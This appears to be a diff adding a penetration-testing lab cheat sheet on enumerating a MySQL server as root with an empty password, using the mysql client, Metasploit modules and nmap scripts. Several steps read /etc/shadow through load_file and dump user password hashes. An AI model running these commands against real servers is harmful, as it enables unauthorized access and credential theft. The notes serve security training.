@@ -1,0 +1,177 @@
+# MySQL ENUMERATION - PART 1
+
+---------------------------------------------------------------
+
+### Command used to connect to remote MySQL database
+
+> mysql -h 192.71.145.3 -u root
+
+
+---------------------------------------------------------------
+
+### How many databases are present on the database server
+
+After connected to the mySQL Server, enter this command :
+
+> show databases;
+
+
+---------------------------------------------------------------
+
+### show the number of records present in table 
+
+Database name : books
+Example : table named "authors”
+
+> - use books;
+> - select count(*) from authors;
+
+
+---------------------------------------------------------------
+
+### Dump the schema of all databases from the given server
+
+> - msfconsole
+> - use auxiliary/scanner/mysql/mysql_schemadump
+> - set RHOSTS 192.71.145.3
+> - set USERNAME root
+> - set PASSWORD ""
+> - exploit
+
+
+---------------------------------------------------------------
+
+### list the writable directories
+
+> - use auxiliary/scanner/mysql/mysql_writable_dirs
+> - set DIR_LIST directory.txt
+> - set RHOSTS 192.71.145.3
+> - set VERBOSE false
+> - set PASSWORD ""
+> - exploit
+
+
+---------------------------------------------------------------
+
+### List the Readable files
+
+> - use auxiliary/scanner/mysql/mysql_file_enum
+> - set RHOSTS 192.71.145.3
+> - set FILE_LIST /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt
+> - set PASSWORD ""
+> - exploit
+
+---------------------------------------------------------------
+
+### Find the system password hash for a user
+
+At this point, we know that we can read the file /etc/shadow
+
+> - mysql -h 192.71.145.3 -u root
+> - select load_file("/etc/shadow");
+
+
+---------------------------------------------------------------
+
+### List all usernames & hashes of database server 
+
+> - use auxiliary/scanner/mysql/mysql_hashdump
+> - set RHOSTS 192.71.145.3
+> - set USERNAME root
+> - set PASSWORD ""
+> - exploit
+
+
+---------------------------------------------------------------
+
+### Check whether anonymous login is allowed on MySQL Server.
+
+> nmap --script=mysql-empty-password -p 3306 192.71.145.3
+
+
+---------------------------------------------------------------
+
+### Check whether “InteractiveClient” capability is supported on the MySQL server
+
+
+> nmap --script=mysql-info -p 3306 192.71.145.3
+
+
+---------------------------------------------------------------
+
+### Enumerate the users present on MySQL database server using NMAP
+
+At this point, we know that we can read the file /etc/shadow
+
+> nmap --script=mysql-users --script args="mysqluser='root', mysqlpass=''" -p 3306 192.71.145.3
+
+---------------------------------------------------------------
+
+### List all databases stored on the MySQL Server using NMAP
+
+> nmap --script=mysql-databases --script-args="mysqluser='root', mysqlpass=''" -p 3306 192.71.145.3
+
+---------------------------------------------------------------
+
+### Find the data directory used by mysql server using nmap script
+
+
+> nmap --script=mysql-variables --script-args="mysqluser='root', mysqlpass=''" -p 3306 192.71.145.3
+
+NB : datadir : < data_directory >
+
+
+---------------------------------------------------------------
+
+### Check whether File Privileges can be granted to non admin users using NMAP
+
+
+> nmap --script=mysql-audit --script-args "mysql-audit.username='root', mysql-audit.password='', mysql-audit.filename='/usr/share/nmap/n
+selib/data/mysql-cis.audit'" -p 3306 192.71.145.3
+
+---------------------------------------------------------------
+
+### Dump all user hashes using NMAP
+
+> nmap --script mysql-dump-hashes --script args="username='root', password=''" -p 3306 192.71.145.3
+
+---------------------------------------------------------------
+
+### Run SQL commands using NMAP
+
+Database : books
+table : authors
+
+> nmap --script=mysql-query --script-args="query='select count(*) from
+books.authors;',username='root',password=''" -p 3306 192.71.145.3
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
